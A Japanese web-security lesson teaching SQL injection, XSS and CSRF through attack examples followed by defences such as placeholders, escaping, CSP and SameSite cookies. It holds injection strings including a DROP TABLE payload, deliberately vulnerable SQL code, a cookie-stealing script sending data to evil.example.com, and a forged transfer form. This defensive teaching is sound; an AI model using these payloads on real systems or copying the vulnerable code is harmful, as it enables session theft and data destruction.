# Lesson 10: セキュリティ基礎

## このレッスンで学ぶこと

このレッスンはすべて**攻撃例 → なぜ効くか → 防御**の順で説明します。目的は攻撃することではなく、防御できるエンジニアになることです。

- SQL インジェクション
- XSS(Cross-Site Scripting)
- CSRF(Cross-Site Request Forgery)
- その他の重要なセキュリティ事項

---

## 1. SQL インジェクション(SQL Injection)

### 攻撃例

ログイン画面があるとします。

```python
# 危険なコード
def login(email: str, password: str):
    conn = sqlite3.connect("app.db")
    # ユーザー入力を直接 SQL に埋め込んでいる!
    sql = f"SELECT * FROM users WHERE email = '{email}' AND password = '{password}'"
    result = conn.execute(sql).fetchone()
    return result is not None
```

攻撃者がメールアドレスに以下を入力したとします。

```
email: admin@example.com' --
password: (何でも良い)
```

実行される SQL：

```sql
SELECT * FROM users WHERE email = 'admin@example.com' -- ' AND password = '...'
-- 以降はコメントとして無視される
-- → email だけで一致すればパスワードなしでログインできる
```

さらに悪質な例：

```
email: ' OR '1'='1' --
```

```sql
SELECT * FROM users WHERE email = '' OR '1'='1' -- ' AND password = '...'
-- '1'='1' は常に真なので全ユーザーが返る
-- 最初のユーザー(多くの場合 admin)でログインできてしまう
```

最悪のケース：

```
email: '; DROP TABLE users; --
```

```sql
SELECT * FROM users WHERE email = ''; DROP TABLE users; -- ...
-- users テーブルが消える
```

### なぜ効くか

ユーザーの入力を SQL の「データ」として扱わず、SQL の「命令」の一部として解釈させているからです。SQL のデータと命令の境界を破ることで、任意の SQL を実行できます。

### 防御

**プリペアドステートメント(プレースホルダー)を使う**

```python
# 安全: プレースホルダーを使う
def login(email: str, password: str):
    conn = sqlite3.connect("app.db")
    # ? がプレースホルダー。値は別に渡す
    sql = "SELECT * FROM users WHERE email = ? AND password = ?"
    result = conn.execute(sql, (email, password)).fetchone()
    return result is not None
```

プレースホルダーを使うと、ユーザーの入力はデータとして扱われ、SQL 命令として解釈されません。`' OR '1'='1` という入力は、`email = "' OR '1'='1"` という文字列として比較されるだけです。

```python
# SQLAlchemy でも同様に安全
# ORM の操作は自動的にプレースホルダーを使う
user = db.query(User).filter(User.email == email).first()

# SQLAlchemy で生 SQL を書く場合は text() を使う
from sqlalchemy import text
db.execute(text("SELECT * FROM users WHERE email = :email"), {"email": email})
```

**その他の対策**

- DB ユーザーに最小限の権限を与える(DROP TABLE できないユーザーを使う)
- WAF(Web Application Firewall)を使う
- エラーメッセージに SQL を含めない(DB 構造の露出を防ぐ)

---

## 2. XSS(Cross-Site Scripting、クロスサイトスクリプティング)

### 攻撃例

コメント投稿機能があるとします。

```
攻撃者が以下のコメントを投稿する:
<script>
  document.location = 'https://evil.example.com/steal?cookie=' + document.cookie;
</script>
```

このコメントがエスケープされずにページに表示されると、閲覧したすべてのユーザーのブラウザで上記のスクリプトが実行されます。

結果：
- Cookie が攻撃者のサーバーに送られる
- セッション ID が盗まれ、攻撃者がそのユーザーとして操作できる
- キーロガーで入力内容を盗む

### なぜ効くか

ユーザーの入力をエスケープせずにそのままHTMLとして出力すると、ブラウザはそれを正規なHTMLとして解釈・実行します。

### 防御

**バックエンドでのエスケープ**

```python
import html

user_input = '<script>alert("XSS")</script>'
safe_output = html.escape(user_input)
# → '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'
# ブラウザはこれをタグとして解釈せず、テキストとして表示する
```

**フロントエンドでのエスケープ**

React などのフレームワークは**デフォルトでエスケープ**します。

```jsx
// React: 安全 (自動エスケープ)
const comment = '<script>alert("XSS")</script>';
return <div>{comment}</div>;  // テキストとして表示される

// React: 危険 (エスケープを無効化)
return <div dangerouslySetInnerHTML={{__html: comment}} />;
// dangerouslySetInnerHTML は名前の通り危険。使う場合は必ずサニタイズする
```

**Content Security Policy(CSP)**

レスポンスヘッダーで実行できるスクリプトの源を制限します。

```python
# FastAPI でのヘッダー設定
from fastapi import Response

@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; script-src 'self'"
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    return response
```

**Cookie の HttpOnly 属性**

`HttpOnly` を設定すると JavaScript から Cookie にアクセスできなくなります。XSS で Cookie を盗まれることを防ぎます。

```
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
```

---

## 3. CSRF(Cross-Site Request Forgery、クロスサイトリクエストフォージェリ)

### 攻撃例

ECサイト(`bank.example.com`)にログイン中のユーザーが、攻撃者のサイトを訪問するとします。

```html
<!-- 攻撃者のサイト(evil.example.com) に仕掛けたコード -->
<form action="https://bank.example.com/transfer" method="POST" id="evil-form">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="100000" />
</form>
<script>document.getElementById('evil-form').submit();</script>
```

ユーザーがこのページを開くと、ユーザーの Cookie(セッション)が自動的に送られ、`bank.example.com` への送金リクエストが実行されます。

### なぜ効くか

ブラウザは `bank.example.com` に対するリクエストに、保存されている Cookie を自動的に付与します。サーバーは「正規ユーザーからのリクエスト」と区別できません。

### 防御

**SameSite Cookie 属性**

最も効果的な対策です。

```
Set-Cookie: session_id=abc123; SameSite=Strict; HttpOnly; Secure
```

- `SameSite=Strict`: 同一サイトのリクエストにのみ Cookie を送る。別サイトからのリクエストには Cookie が付かない
- `SameSite=Lax`: GET リクエストのみ別サイトからも Cookie を送る(多くの場合これで十分)

**CSRF トークン**

SameSite をサポートしない古いブラウザ向けの対策。

```python
import secrets

# サーバーが生成したランダムなトークンをフォームに埋め込む
csrf_token = secrets.token_hex(32)
# → セッションに保存し、フォームにも hidden フィールドとして埋め込む

# リクエスト時にトークンを検証
# 攻撃者サイトはこのトークンを知らないため、正しいトークンを送れない
```

**JWT(Authorization ヘッダー)**

JWT を `Authorization: Bearer ...` ヘッダーで送る場合、ブラウザは自動的には送りません。CSRF の影響を受けません。(Cookie ではなく JavaScript で明示的に付与するため)

---

## 4. その他の重要なセキュリティ事項

### 4-1. 機密情報の管理

```python
# 悪い例: コードに機密情報を直書き
SECRET_KEY = "my-super-secret-key"
DATABASE_URL = "postgresql://admin:password123@localhost/mydb"

# 良い例: 環境変数から読み込む
import os
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    secret_key: str
    database_url: str
    access_token_expire_minutes: int = 30

    class Config:
        env_file = ".env"

settings = Settings()
```

```
# .env ファイル(Git に含めない!)
SECRET_KEY=a-very-long-random-string
DATABASE_URL=sqlite:///./app.db
```

```
# .gitignore に追加
.env
*.env
```

### 4-2. レートリミット(Rate Limiting)

1つの IP アドレスから短時間に大量のリクエストを送るブルートフォース攻撃を防ぎます。

```bash
pip install slowapi
```

```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)


@app.post("/api/v1/auth/login")
@limiter.limit("5/minute")  # 1分間に5回まで
async def login(request: Request, ...):
    ...
```

### 4-3. HTTPS の強制

本番環境では必ず HTTPS を使います。HTTP では通信内容が平文で流れるため、盗聴が可能です。

```python
# HTTP → HTTPS リダイレクト(リバースプロキシで行うことが多い)
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware

app.add_middleware(HTTPSRedirectMiddleware)
```

### 4-4. 入力値の検証

```python
from pydantic import BaseModel, Field, field_validator
import re


class UserCreate(BaseModel):
    name: str = Field(..., min_length=1, max_length=100)
    email: str = Field(...)
    password: str = Field(..., min_length=8, max_length=100)

    @field_validator("password")
    @classmethod
    def password_complexity(cls, v: str) -> str:
        if not re.search(r"[A-Z]", v):
            raise ValueError("パスワードには大文字を含めてください")
        if not re.search(r"[0-9]", v):
            raise ValueError("パスワードには数字を含めてください")
        return v
```

### 4-5. エラーメッセージで内部情報を漏らさない

```python
# 悪い例: DB エラーをそのまま返す
try:
    result = db.execute(some_query)
except Exception as e:
    return {"error": str(e)}
# → "UNIQUE constraint failed: users.email" などが漏れる

# 良い例: ユーザー向けメッセージだけ返す
try:
    result = db.execute(some_query)
except Exception as e:
    logger.error(f"DB エラー: {e}")  # ログには詳細を残す
    raise HTTPException(status_code=500, detail="サーバーエラーが発生しました")
```

---

## 5. セキュリティチェックリスト

実装時に確認してください。

- [ ] ユーザー入力は必ずプレースホルダー経由で SQL に渡している
- [ ] パスワードは bcrypt でハッシュ化している
- [ ] JWT の秘密鍵は環境変数で管理している
- [ ] Cookie に HttpOnly, Secure, SameSite=Strict を設定している
- [ ] HTML 出力時にエスケープしている(React は自動だが確認)
- [ ] `.env` ファイルが `.gitignore` に含まれている
- [ ] エラーメッセージに内部情報(スタックトレース、SQL など)が含まれていない
- [ ] 認証が必要なエンドポイントに Depends で保護をかけている
- [ ] ログイン試行にレートリミットをかけている

---

## 💡 コラム: リトル・ボビー・テーブルズ

セキュリティ教育の世界で最も有名な教材は、Web コミック xkcd の一コマ漫画です。学校からの電話: 「息子さんの名前は本当に **Robert'); DROP TABLE Students;--** ですか? 生徒データベースが全部消えました」。母親の答え: 「ええ、うちでは*リトル・ボビー・テーブルズ*と呼んでいます。**入力のサニタイズを怠ったおたくが悪い**のよ」。

名前(ただの入力データ)が SQL 文の一部として実行されてしまう — SQL インジェクションの原理と対策責任の所在を、これほど簡潔に伝えた教材はありません。世界中の開発者が「Bobby Tables」の一言でこの脆弱性を語ります。

笑い話で済まないのは、**史上最大級の情報漏洩事件の多くが、この漫画レベルの古典的な穴から起きている**ことです。何千万件の個人情報流出の原因が「プレースホルダを使っていなかった」「パスワードを平文保存していた」だった例は枚挙にいとまがありません。セキュリティの実務は、天才ハッカーとの攻防である前に、**既知の凡ミスを確実に潰す規律**なのです。

---

## まとめ

- SQL インジェクション: ユーザー入力を SQL に直接埋め込まない。プレースホルダーを使う
- XSS: HTML 出力時にエスケープする。Cookie に HttpOnly を設定する。CSP を設定する
- CSRF: SameSite=Strict Cookie を使う。API は Authorization ヘッダーで認証する
- 機密情報は環境変数で管理し、コードに書かない
- エラーメッセージで内部情報を漏らさない

---

## 確認問題

1. 以下のコードの問題点を指摘し、修正してください。
   ```python
   def search_users(name: str, db):
       sql = f"SELECT * FROM users WHERE name LIKE '%{name}%'"
       return db.execute(sql).fetchall()
   ```
2. XSS 攻撃で Cookie が盗まれた場合、攻撃者は何ができますか？`HttpOnly` 属性を設定するとなぜ防げますか？
3. React のアプリで `dangerouslySetInnerHTML` を使わなければならない場合(リッチテキストの表示など)、どのような対策が必要ですか？
4. `.env` ファイルを Git に含めてはいけない理由を説明してください。

---

## よくある間違い

**「フロントエンドで検証しているから大丈夫」**
フロントエンドの検証は UX のためのものです。HTTP リクエストは curl などで直接送れるため、フロントエンドをバイパスできます。バックエンドでの検証は必須です。

**ORM を使っていれば SQL インジェクションは大丈夫と思い込む**
ORM を使っていても、`text()` などで生 SQL を書く場合は手動でプレースホルダーを使う必要があります。また、ORM のフィルタリングメソッドを正しく使わないと脆弱になる場合があります。

**開発環境の設定を本番に持ち込む**
`allow_origins=["*"]`(CORS)、`debug=True`(スタックトレースの表示)、弱い SECRET_KEY など、開発の便宜で設定したものを本番に持ち込まないよう注意してください。
